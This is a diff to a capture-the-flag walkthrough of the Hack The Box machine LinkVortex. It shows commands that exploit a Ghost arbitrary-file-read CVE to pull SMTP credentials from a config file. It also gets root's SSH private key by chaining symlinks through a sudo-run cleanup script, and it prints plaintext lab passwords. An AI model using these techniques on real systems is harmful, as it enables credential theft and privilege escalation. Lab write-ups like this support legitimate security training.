@@ -4,7 +4,7 @@ icon: ubuntu
 
 # LinkVortex - Easy
 
-<figure><img src="../../.gitbook/assets/image.png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/linkvortex"><strong>LinkVortex</strong></a></p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (15).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/linkvortex"><strong>LinkVortex</strong></a></p></figcaption></figure>
 
 ## <mark style="color:blue;">Gaining Access</mark>
 
@@ -206,3 +206,150 @@ admin@linkvortex.htb:OctopiFociPilfer45
 A quick google search for Ghost version 5.58, yeilds a CVE
 
 <figure><img src="../../.gitbook/assets/image (3038).png" alt=""><figcaption></figcaption></figure>
+
+#### <mark style="color:yellow;">Ghost v5.57 Arbitrary File Read</mark>
+
+{% code overflow="wrap" %}
+```shellscript
+git clone https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028.git
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Nice we got a working exploit!
+
+The Git repo had the `Dockerfile` for running the Ghost container. One thing it did was copy the config file into the container
+
+```shellscript
+/var/lib/ghost/config.production.json
+```
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+At the bottom the SMTP setup has creds for bob@linkvortex.htb
+
+```shellscript
+bob@linkvortex.htb:fibber-talented-worth
+```
+
+```shellscript
+netexec ssh linkvortex.htb -u bob -p fibber-talented-worth
+```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+bob has SSH access
+
+```shellscript
+ssh bob@linkvortex.htb
+```
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+## <mark style="color:blue;">Privilege Escalation</mark>
+
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+bob can run a bash script as the root user&#x20;
+
+The script starts by defining some variables, initializing `CHECK_CONTENT` to false if it is not set, and making sure that the first input ends with `.png`
+
+```shellscript
+#!/bin/bash
+
+QUAR_DIR="/var/quarantined"
+
+if [ -z $CHECK_CONTENT ];then
+  CHECK_CONTENT=false
+fi
+
+LINK=$1
+
+if ! [[ "$LINK" =~ \.png$ ]]; then
+  /usr/bin/echo "! First argument must be a png file !"
+  exit 2
+fi
+```
+
+The rest is a series of nested `if` statements
+
+```shellscript
+if /usr/bin/sudo /usr/bin/test -L $LINK;then
+  LINK_NAME=$(/usr/bin/basename $LINK)
+  LINK_TARGET=$(/usr/bin/readlink $LINK)
+  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
+    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
+    /usr/bin/unlink $LINK
+  else
+    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
+    /usr/bin/mv $LINK $QUAR_DIR/
+    if $CHECK_CONTENT;then
+      /usr/bin/echo "Content:"
+      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
+    fi
+  fi
+fi
+```
+
+If the scanned file is not a link, it doesn’t do anything.
+
+It checks the target of the link, and if it contains the string “etc” or “root”, it prints a warning and removes the link.
+
+Otherwise, it moves the link file to the quarantine directory. If `CHECK_CONTENT` is true, then it prints the contents of the link.
+
+### <mark style="color:$primary;">Exploiting clean\_symlink.sh</mark>
+
+#### <mark style="color:yellow;">Double Symlinks</mark>
+
+The script gets the content of the link, and makes sure that the target of the link doesn’t have \[root] or \[etc] in it. What it doesn’t check is if that target is itself is also a symlink. So I can make something like
+
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+This will pass the checks, and allow when it tries to `cat a.png`, it will print the ssh key
+
+It’s worth noting that [Protected Symlinks](https://sysctl-explorer.net/fs/protected_symlinks/) is enabled here \[as is the default on Ubuntu]:
+
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+This means:
+
+symlinks are permitted to be followed only when outside a sticky world-writable directory, or when the uid of the symlink and follower match, or when the directory owner matches the symlink's owner.
+
+This protecting was developed specifically to address Time-of-Check to Time-of-Use (TOCTOU) vulnerabilities (which I’ll show in the next method), but also bites me here if I’m not careful. I need to avoid putting symlinks that I want to follow (like `b` above) in `/tmp`, `/var/tmp`, or `/dev/shm`, etc
+
+```shellscript
+find / -type d -perm -0002 -perm -1000 2>/dev/null
+```
+
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+To exploit this, I’ll create the link `b` from the diagram above
+
+```shellscript
+ln -s /root/.ssh/id_rsa /home/bob/.cache/b
+```
+
+<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+Next I’ll create `a.png`, another link pointing to `b`
+
+```shellscript
+ln -s /home/bob/.cache/b /home/bob/.cache/a.png
+```
+
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+Now, with the environment variable to get contents set, I’ll check `a.png`
+
+{% code overflow="wrap" %}
+```shellscript
+CHECK_CONTENT=true sudo bash /opt/ghost/clean_symlink.sh /home/bob/.cache/a.png
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+It worked we got the root user's ssh key. I'll save it to my machine give it the correct permissions and use it to ssh as the root user
+
+<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
